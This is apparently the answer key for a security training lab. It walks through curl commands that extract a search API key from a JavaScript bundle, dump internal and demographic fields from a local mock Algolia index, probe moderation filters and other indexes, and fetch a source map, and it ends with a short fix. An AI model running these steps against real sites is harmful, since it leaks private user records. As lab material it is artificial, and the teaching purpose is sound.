# SOLUTION — Lab-04

```bash
# 1) key extraction
curl http://127.0.0.1:8004/dist/bundle-abc123.js
# appId=LABAPP123 apiKey=search-public-key-lives-in-js index=prod_talent_v0

# 2) wildcard query = field dictionary
curl -X POST http://127.0.0.1:8004/1/indexes/prod_talent_v0/query \
 -H "X-Algolia-Application-Id: LABAPP123" -H "X-Algolia-API-Key: search-public-key-lives-in-js" \
 -H "Content-Type: application/json" -d '{"query":"","hitsPerPage":10}'
# -> full records: internal field names + FLAG{...} visible on one record

# 3) explicit internal fields -> flag
curl -X POST http://127.0.0.1:8004/1/indexes/prod_talent_v0/query \
 -H "X-Algolia-Application-Id: LABAPP123" -H "X-Algolia-API-Key: search-public-key-lives-in-js" \
 -H "Content-Type: application/json" \
 -d '{"query":"","hitsPerPage":10,"attributesToRetrieve":["username","internal_engagement_scores","computed_features_order_counts"]}'

# 4) moderation filter oracle + facets + 2nd index volume probe
curl -X POST http://127.0.0.1:8004/1/indexes/prod_talent_v0/query -H "X-Algolia-Application-Id: LABAPP123" \
 -H "X-Algolia-API-Key: search-public-key-lives-in-js" -H "Content-Type: application/json" \
 -d '{"query":"","hitsPerPage":50,"filters":"restrictions:high","attributesToRetrieve":["username","restrictions"]}'

curl -X POST http://127.0.0.1:8004/1/indexes/prod_talent_v0/query -H "X-Algolia-Application-Id: LABAPP123" \
 -H "X-Algolia-API-Key: search-public-key-lives-in-js" -H "Content-Type: application/json" \
 -d '{"query":"","hitsPerPage":1,"facets":["talent_demographic.gender"],"maxValuesPerFacet":10}'

curl http://127.0.0.1:8004/1/indexes -H "X-Algolia-API-Key: search-public-key-lives-in-js"
curl -X POST http://127.0.0.1:8004/1/indexes/prod_business_talent_v0/query \
 -H "X-Algolia-Application-Id: LABAPP123" -H "X-Algolia-API-Key: search-public-key-lives-in-js" \
 -H "Content-Type: application/json" -d '{"query":"","hitsPerPage":0}'

# 5) source map
curl http://127.0.0.1:8004/dist/server.js.map  # dev key + anti-bot bypass list
```

**Fix:** `unretrievableAttributes` for internal fields + per-index key scoping + no `.map` files in production.
